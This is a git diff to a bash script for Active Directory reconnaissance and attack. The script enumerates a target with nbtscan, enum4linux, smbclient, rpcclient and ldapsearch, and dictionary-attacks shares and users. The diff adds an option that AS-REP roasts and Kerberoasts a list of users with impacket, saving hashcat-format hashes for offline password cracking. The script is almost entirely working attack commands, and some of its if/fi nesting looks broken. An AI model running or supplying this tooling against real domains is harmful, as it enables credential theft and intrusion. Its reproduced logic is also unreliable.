@@ -1,7 +1,7 @@
 #!/bin/bash
 # Check if the target IP is provided as an argument
 if [ -z "$1" ]; then
-    echo "Usage: $0 <target_ip>  [-u=<username>] [-p=<password>] [-d=<domain>] [-b] [-v] "
+    echo "Usage: $0 <target_ip>  [-u=<username>] [-p=<password>] [-d=<domain>] [-r=<filename>] [-b] [-v] "
     exit 1
 fi
 # Function to display verbose messages
@@ -21,13 +21,16 @@ password=""
 domain=""
 bruteForceShares=false
 VERBOSE=false
+#asrep-roasting & kerberoasting
+roasting=""
 
-while getopts "u:p:d:bv" opt; do
+while getopts "u:p:d:r:bv" opt; do
   case $opt in
     u) username=$OPTARG;;
     p) password=$OPTARG;;
     d) domain=$OPTARG;;
     b) bruteForceShares=true;;
+    r) roasting=$OPTARG;;
     v) VERBOSE=true;;
     \?) echo "Invalid option: -$OPTARG" >&2
         exit 1;;
@@ -40,6 +43,7 @@ echo "VERBOSE is set to: $VERBOSE"
 echo "bruteForceShares is set to: $bruteForceShares"
 echo "username is set to: $username"
 echo "IP address:" $TARGET_IP
+echo "ROasting:" $roasting
 # Display script header
 verbose_message "Script started."
 domainName=$(echo $domain | cut -d'.' -f1)
@@ -55,9 +59,9 @@ nbtscan -r "$TARGET_IP" > nbtscan/clientNcomputer
 enum4linux -a "$TARGET_IP" -u $username -p $password > enum4linux/index
 #enum4linux -a "$TARGET_IP" -u $username -p $password | grep -i "User" > enum4linux/enumUser
 #BRUTE FORCE HERE
-verbose_message "Running smbclient & enum4linux"
-verbose_message "Dicitionary attack shares using enum4linux"
 if [ "$bruteForceShares" == "true" ]; then
+    verbose_message "Running smbclient & enum4linux"
+    verbose_message "Dicitionary attack shares using enum4linux"
     enum4linux -s "$WORDLIST" "$TARGET_IP" -u $username -p $password > enum4linux/Shares
     if [ -z "$username" ] || [ -z "$password" ]; then
         smbclient -L "//${TARGET_IP}" -N >> smbclient/sharex
@@ -75,7 +79,7 @@ if [ "$bruteForceShares" == "true" ]; then
     done < "$METASPLOIT_USERS" | grep "User: 1$" >> rpcclient/foundUserRPCclient.txt
 fi
 #END BRUTE FORCE SHARE
-if [ -z "$domain" ]; then
+if [ -n "$domain" ] && [ -n "$username" ] && [ -n "$password" ]; then
     verbose_message "Running ldapsearch\(credential given\)"
     ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Administrators,CN=Builtin,DC=$domainName,DC=$tld" > ldapsearch/Administrator
     ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Users,DC=$domainName,DC=$tld" > ldapsearch/Users
@@ -87,5 +91,25 @@ if [ -z "$domain" ]; then
     ldapsearch -x -H ldap://${TARGET_IP} -b "DC=$domainName,DC=$tld" "(objectclass=organizationalUnit)" dn | grep "dn" ldapsearch/OU
 else
     verbose_message "Running ldapsearch\(anon bind\)"
+    verbose_message "checking anonymous bind..."
     ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} > ldapsearch/index
+    grep "bind must be completed" ldapsearch/index
+    if grep -q "bind must be completed" ldapsearch/index; then
+        echo "anonymous bind is ok"
+    else
+        verbose_message "anonymous bind is not present"
+fi
+fi
+if [ -n "$roasting" ] && [ -n "$username" ]; then
+    verbose_message "asreproast & kerberoasting users in ${roasting}"
+    while IFS= read -r u; do
+        verbose_message "$u"
+        #asreproasting & Kerberoasting
+        #GetNPUsers.py can be used to retrieve domain users who do not have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords. 
+        #It is then possible to attempt to crack the session key sent along the ticket to retrieve the user password. 
+        #This attack is known as ASREProast.
+        impacket-GetNPUsers ${domainName}/${username} -request -format hashcat -outputfile ${u}asreproast.hashes
+        #get the SPNs on the domain; the given username is just for login thing(sometimes you don't need the password)
+        impacket-GetUserSPNs -dc-ip ${TARGET_IP} ${domainName}/${username} -request-user ${u} -save
+    done < "$roasting"
 fi
